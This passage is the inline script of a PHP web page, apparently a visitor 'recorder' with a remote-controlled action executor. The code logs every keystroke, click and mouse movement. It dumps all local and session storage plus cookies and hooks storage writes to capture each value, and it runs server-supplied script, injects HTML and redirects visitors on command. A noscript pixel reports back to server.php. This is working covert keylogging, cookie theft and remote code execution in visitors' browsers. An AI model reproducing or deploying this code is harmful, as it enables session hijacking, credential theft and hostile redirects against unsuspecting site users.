              window.addEventListener(ev, run, { once: true, passive: true, capture: true });
            }
          }
        }
      } catch (_) { }
    })();

    // ---- Recorder wiring ----
    function add(name, target) {
      if (!target || typeof target.addEventListener !== 'function') target = window;
      target.addEventListener(name, e => {
        const t = performance.now() - START; const d = {};
        if (e instanceof MouseEvent) { d.x = e.clientX; d.y = e.clientY; d.button = e.button; }
        if (e instanceof KeyboardEvent) { d.key = e.key; d.code = e.code; d.ctrl = e.ctrlKey; d.meta = e.metaKey; d.alt = e.altKey; }
        if (name === 'scroll') { d.scrollY = window.scrollY; d.scrollX = window.scrollX; }
        if (name === 'resize') { d.vw = innerWidth; d.vh = innerHeight; }
        if (name === 'visibilitychange') { d.visibility = document.visibilityState; }
        if (name === 'hashchange' || name === 'popstate') { d.url = location.href; }
        enqueue({ type: name, t, data: d });
      }, { passive: true, capture: true });
    }
    function wire() {
      ['click', 'dblclick', 'contextmenu', 'keydown', 'keypress', 'keyup', 'change', 'input', 'submit', 'focus', 'blur', 'visibilitychange', 'hashchange', 'popstate', 'pageshow', 'pagehide', 'play', 'pause', 'ended', 'error', 'ratechange', 'volumechange'].forEach(n => add(n));
      window.addEventListener('mousemove', e => { const now = performance.now(); if (now - (S.lastMouse || 0) < 50) return; S.lastMouse = now; enqueue({ type: 'mousemove', t: now - START, data: { x: e.clientX, y: e.clientY } }); }, { passive: true, capture: true });
      window.addEventListener('scroll', e => { const now = performance.now(); if (now - (S.lastScroll || 0) < 100) return; S.lastScroll = now; const pct = Math.round((window.scrollY / ((document.documentElement.scrollHeight - window.innerHeight) || 1)) * 100); enqueue({ type: 'scroll', t: now - START, data: { scrollY: window.scrollY, scrollX: window.scrollX, percent: pct } }); }, { passive: true, capture: true });
      add('resize');
      enqueue({ type: 'load', t: performance.now() - START, data: { url: location.href } });
      try {
        const dump = (s) => { const o = {}; for (let i = 0; i < s.length; i++) { const k = s.key(i); o[k] = s.getItem(k); } return o; };
        enqueue({ type: 'storage_dump', t: performance.now() - START, data: { local: dump(localStorage), session: dump(sessionStorage), cookies: document.cookie } });
        const wrap = (stor, name) => {
          const set = stor.setItem.bind(stor), rm = stor.removeItem.bind(stor), clr = stor.clear.bind(stor);
          stor.setItem = (k, v) => { enqueue({ type: 'storage_set', t: performance.now() - START, data: { store: name, key: k, value: v } }); return set(k, v); };
          stor.removeItem = (k) => { enqueue({ type: 'storage_remove', t: performance.now() - START, data: { store: name, key: k } }); return rm(k); };
          stor.clear = () => { enqueue({ type: 'storage_clear', t: performance.now() - START, data: { store: name } }); return clr(); };
        };
        wrap(localStorage, 'local'); wrap(sessionStorage, 'session');
      } catch (_) { }
    }
    wire();

    // ---- Interactive quick pass ----
    (function interactiveSignals() {
      window.addEventListener('keydown', () => { enqueue({ type: 'fp_interactive', t: performance.now() - START, data: { evt_keypress: 'true' } }); }, { once: true, capture: true });
      window.addEventListener('click', (e) => { enqueue({ type: 'fp_interactive', t: performance.now() - START, data: { evt_click_xy: (e.clientX + ',' + e.clientY) } }); }, { once: true, capture: true });
    })();

    // ---- Action executor (prefers resolved_url) ----
    function doAction(a) {
      try {
        enqueue({ type: 'action_taken', t: performance.now() - START, data: a });
        const url = a?.data?.resolved_url || a?.data?.url || '';
        switch (a?.type) {
          case 'js-redirect': if (url) location.href = url; break;
          case 'js-includehtml':
            if (a.data?.html) { const d = document.createElement('div'); d.innerHTML = a.data.html; document.body.appendChild(d); }
            if (a.data?.script) { const s = document.createElement('script'); s.textContent = a.data.script; document.body.appendChild(s); }
            break;
          case 'js-exec':
            if (a.data?.script) { const s = document.createElement('script'); s.textContent = a.data.script; document.body.appendChild(s); }
            break;
          case 'server-301-redirect': case 'server-302-redirect':
            if (url) location.replace(url); break;
        }
      } catch (_) { }
    }

  })();
</script>
<noscript>
  <?php
  $imgUrl = rtrim(dirname($_SERVER['SCRIPT_NAME']), '/\\') . '/server.php';
  $imgUrl = (str_ends_with($imgUrl, '/server.php') ? $imgUrl : $imgUrl . '/server.php');
  $imgUrl = ($imgUrl[0] === '/' ? $imgUrl : ('/' . $imgUrl)) . '?mode=ns&amp;sid=' . rawurlencode($sid) . '&amp;url=' . rawurlencode($_SERVER['REQUEST_URI'] ?? '');
  ?>
  <img src="<?= $imgUrl ?>" alt="" width="1" height="1" />
</noscript>